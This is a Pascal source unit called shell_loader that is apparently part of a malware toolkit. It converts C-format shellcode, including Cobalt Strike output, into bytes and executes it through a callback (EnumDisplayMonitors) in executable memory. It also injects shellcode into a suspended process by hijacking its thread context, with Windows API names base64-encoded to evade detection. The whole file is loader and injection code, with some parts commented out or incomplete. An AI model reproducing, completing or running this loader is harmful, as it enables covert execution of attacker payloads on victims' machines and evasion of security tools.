unit shell_loader;


{$mode Delphi}

interface

uses
  Classes,windows,strutils,base64,syscalls,jwawindows,JwaWinType,SysUtils;

const

  {normal}
 PROC_INJEC = 'C:\windows\system32\cmd.exe';  // #1 base64 it

{DO EARLY BIRD}


type
  TByteArray = array of byte;

type
  TMonInfo = record
    h: THandle;
    dc: HDC;
    r: TRect;
  end;




var
  MonList: array of TMonInfo;

procedure inject_shell(shell_content:string);
Function ConvertShellCode(ShellContent:String):String;
Function GetShellCodeSize(ShellContent:string):Cardinal;
procedure callback_inject(shell_content:string);



//function Base64ToStream(const ABase64:string; AOutStream: TMemoryStream; const AStrict: Boolean=false):Boolean;

// procedure RtlMoveMemory(
 //   Destination : PVOID;
 //   Source : PVOID;
 //   Length : SIZE_T
//  ); stdcall;

// function EnumDisplayMonitors(hdc: HDC; lprcClip: LPCRECT;
//  lpfnEnum: MONITORENUMPROC; dwData: LPARAM): BOOL; stdcall;
//{$EXTERNALSYM EnumDisplayMonitors}


// function EnumDisplayMonitors( dc: HDC; rect: PRect; EnumProc: LPVOID;
 // lData: LPARAM ): BOOL; stdcall; external user32;

implementation


function LoadshellToStr(const FileName: TFileName): AnsiString;
var
  FileStream : TFileStream;
begin
  FileStream:= TFileStream.Create(FileName, fmOpenRead or fmShareDenyWrite);
    try
     if FileStream.Size>0 then
     begin
      SetLength(Result, FileStream.Size);
      FileStream.Read(Pointer(Result)^, FileStream.Size);
     end;
    finally
     FileStream.Free;
    end;
end;

function CutString(const input,pattern: String): String;
var
  p: Integer;
begin
  p := input.IndexOf(pattern);
  if (p >= 0) then
    Result := input.Substring(0,p)
  else
    Result := input;
end;


Function ConvertShellCode(ShellContent:String):String;
var
num : integer;
shell_tmp : string;
pattern: string;
Begin

pattern := '*/';
num := shellcontent.IndexOf(pattern);
shell_tmp := shellcontent.Substring(0,num);
try

ShellContent := StringReplace(ShellContent, shell_tmp, '', [rfReplaceAll,rfIgnoreCase]);

ShellContent := StringReplace(ShellContent, '\x', ',$', [rfReplaceAll,rfIgnoreCase]);
ShellContent := StringReplace(ShellContent, '"', '', [rfReplaceAll,rfIgnoreCase]);
ShellContent := StringReplace(ShellContent, '''', '', [rfReplaceAll,rfIgnoreCase]);
ShellContent := StringReplace(ShellContent, ';', '', [rfReplaceAll,rfIgnoreCase]);
ShellContent := StringReplace(ShellContent, #13#10, '', [rfReplaceAll,rfIgnoreCase]);
ShellContent := StringReplace(ShellContent, #10, '', [rfReplaceAll,rfIgnoreCase]);
ShellContent := StringReplace(ShellContent, #13, '', [rfReplaceAll,rfIgnoreCase]);
ShellContent := StringReplace(ShellContent, #32, '', [rfReplaceAll,rfIgnoreCase]);
ShellContent := StringReplace(ShellContent, 'unsignedcharbuf[]=', '', [rfReplaceAll,rfIgnoreCase]);
//ShellContent := StringReplace(ShellContent, 'unsigned char buf[] =', '', [rfReplaceAll,rfIgnoreCase]);
{this fix for CobaltStrike }
ShellContent := StringReplace(ShellContent, 'length:', '', [rfReplaceAll,rfIgnoreCase]);
ShellContent := StringReplace(ShellContent, '/*', '', [rfReplaceAll,rfIgnoreCase]);
ShellContent := StringReplace(ShellContent, 'bytes', '', [rfReplaceAll,rfIgnoreCase]);
ShellContent := StringReplace(ShellContent, '*/', '', [rfReplaceAll,rfIgnoreCase]);

{Finalizing the shellcode}
if Copy(ShellContent,1,1) = ',' then system.Delete(ShellContent,1,1);
{Sending Result}

Result := Trim(ShellContent);
Except
Result := 'Error.';
Exit;
End;
End;

Function GetShellCodeSize(ShellContent:string):Cardinal;
var Size,i : Cardinal;
Begin
try
Size := 0;
for i := 0 to length(ShellContent) do
begin
if PosEx(ShellContent[i], '$') > 0 then Inc(Size);
end;
Result := Size;
Except
Result := 0;
Exit;
End;
End;

function StringToBytes(aString: String): TbyteArray;
var
  i: integer;
begin
  SetLength( Result, Length(aString)) ;
  for i := 0 to Length(aString) - 1 do
    Result[i] := ord(aString[i + 1]) { - 48} ;
end;



function LoadByteArray(const AFileName: string): TbyteArray;
var
  Stream: TStream;
  DataLeft: Integer;
begin
  SetLength(result, 0);

  if not FileExists(AFileName) then exit;

  Stream := TFileStream.Create(AFileName, fmOpenRead or fmShareDenyWrite);
  try
     stream.Position:=0;
     DataLeft := Stream.Size;
     SetLength(result, DataLeft div SizeOf(Byte));
     Stream.Read(PByte(result)^, DataLeft);
  finally
     Stream.Free;
  end;

end;


function Base64ToStream(const ABase64:string; AOutStream: TMemoryStream; const AStrict: Boolean=false):Boolean;
var
  InStream: TStringStream;
  Decoder: TBase64DecodingStream;
  temp :string;
    BA_IN, BA_OUT: array of Byte;
begin

  Result := False;
  InStream := TStringStream.Create(ABase64);

  try
    if AStrict then
      Decoder := TBase64DecodingStream.Create(InStream, bdmStrict)
    else
      Decoder := TBase64DecodingStream.Create(InStream, bdmMIME);
    try
      AOutStream.Seek(0,sofrombeginning);
       AOutStream.CopyFrom(decoder,decoder.Size);
       Result := True;
    finally
      Decoder.Free;
    end;
  finally
    InStream.Free;
  end;
end;

function bintostr(const bin: array of byte): string;
const HexSymbols = '0123456789ABCDEF';
var i: integer;
begin
  SetLength(Result, 2*Length(bin));
  for i :=  0 to Length(bin)-1 do begin
    Result[1 + 2*i + 0] := HexSymbols[1 + bin[i] shr 4];
    Result[1 + 2*i + 1] := HexSymbols[1 + bin[i] and $0F];
  end;
end;

{
function MonitorEnumProc( hMonitor: THandle; hdcMonitor: HDC; lprcMonitor: DWORD; dwData: LPARAM ): BOOL; stdcall;
type
  PRect = ^TRect;
var
  i: integer;
begin
   i := High( MonList )+1;
   SetLength( MonList, i+1 );
   MonList[i].h := hMonitor;
   MonList[i].dc := hdcMonitor;
   MonList[i].r := PRect( lprcMonitor )^;
   Result := true;
end;
       }
procedure callback_inject(shell_content:string);
var
i ,s_size: DWORD;
shell_prt : string ;
shell_code :  array of byte;
ptr : pointer;
//Addr : LPVOID;
begin
try
if Trim(shell_content) = '' Then Exit;

shell_content := ConvertShellCode(shell_content);

s_size := GetShellCodeSize(shell_content);
setLength(shell_code,513);
shell_code += [$eb,$f9];

For i := 0 to 513 -1 Do begin

shell_prt := Copy(Shell_Content,1,pos(',',Shell_Content)-1);

if i <> 513 -1 Then system.Delete(Shell_Content,1,pos(',',Shell_Content)) else

shell_prt := Shell_Content;

// copy each byte into array
shell_code[i] := StrToInt(shell_prt);

end;



  //shell_code += $fe;
  ptr := VirtualAlloc(nil,513, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
  //  RtlMoveMemory(ptr, pointer(shell_content), sizeof(shell_content));

  CopyMemory(ptr,shell_code, 513);
  EnumDisplayMonitors(0,nil,MONITORENUMPROC(ptr),0);



finally
end;
end;

procedure inject_shell(shell_content:string);

var
  pi: TProcessInformation;
  si: TStartupInfo;
  {$ifdef win32}

  ctx: Context;
  {$endif}

  {$ifdef win64}
  ctx : Pcontext;
  {$endif}
  remote_shellcodePtr: Pointer;
  {$ifdef win64}
  Written:dword64;
  {$endif}
   {$ifdef win32}
  Written:dword;
  {$endif}
  AppToLaunch: string;
  i ,s_size: Cardinal;
  shell_prt : string ;
 shell_code :  array of byte;
 hmod : Thandle;

begin

try
if Trim(shell_content) = '' Then Exit;

shell_content := ConvertShellCode(shell_content);

s_size := GetShellCodeSize(shell_content);
setLength(shell_code,s_size);

For i := 0 to s_size -1 Do begin

shell_prt := Copy(Shell_Content,1,pos(',',Shell_Content)-1);

if i <> s_size -1 Then system.Delete(Shell_Content,1,pos(',',Shell_Content)) else

shell_prt := Shell_Content;

// copy each byte into array
shell_code[i] := StrToInt(shell_prt);

end;

AppToLaunch := 'notepad.exe';
UniqueString(AppToLaunch);

FillMemory( @si, sizeof( si ), 0 );
FillMemory( @pi, sizeof( pi ), 0 );



hmod := LoadLibrary(Pchar(DecodeStringBase64(KRN)));
{
CP := GetProcAddress(hmod,Pchar(DecodeStringBase64(CP_V)));
syscalls.CP(PROC_INJEC, PChar(AppToLaunch), nil, nil, False,
              CREATE_SUSPENDED,
              nil, nil, si, pi);      }

Alloc := GetProcAddress(hmod,Pchar(DecodeStringBase64(VALLOC)));
Allocx := GetProcAddress(hmod,Pchar(DecodeStringBase64(VLAEX)));
W_S := GetprocAddress(hmod,Pchar(DecodeStringBase64(WPM)));
Get_Con := GetProcAddress(hmod,Pchar(DecodeStringBase64(GTC)));
set_Con := GetProcAddress(hmod,Pchar(DecodeStringBase64(STC)));
res_thread := GetProcAddress(hmod,Pchar(DecodeStringBase64(Rs_thread)));



 {$ifdef win32}
 ctx.ContextFlags := CONTEXT_CONTROL;
 syscalls.Get_Con(pi.hThread,ctx);
 {$endif}

 {$ifdef win64}
 ctx := PCONTEXT(syscalls.Alloc(nil, sizeof(ctx), MEM_COMMIT, PAGE_READWRITE));
 ctx.ContextFlags := CONTEXT_ALL;
// syscalls.Get_Con(pi.hThread,ctx^);
 {$endif}


 //allocate the memory size
 remote_shellcodePtr:=syscalls.Allocx(pi.hProcess,Nil,s_size,MEM_COMMIT,PAGE_EXECUTE_READWRITE);



// NtWriteVirtualMemory(pi.hProcess, remote_shellcodePtr, TByteArray(shell_code), s_size, written);

 // write array of bytes into process memory
 //syscalls.W_S(pi.hProcess,remote_shellcodePtr,TByteArray(shell_code),s_size,written);


{$ifdef win64}
 //ctx.rip:=dword64(remote_shellcodePtr);
 //ctx.ContextFlags := CONTEXT_CONTROL;
// syscalls.set_Con(pi.hThread,ctx^);
 syscalls.res_thread(pi.hThread);
{$ENDIF}

{$ifdef win32}
 ctx.Eip:=integer(remote_shellcodePtr);
 ctx.ContextFlags := CONTEXT_CONTROL;
 syscalls.set_Con(pi.hThread,ctx);

 syscalls.res_thread(pi.hThread);
{$endif}



 finally


 end;
 end;







end.

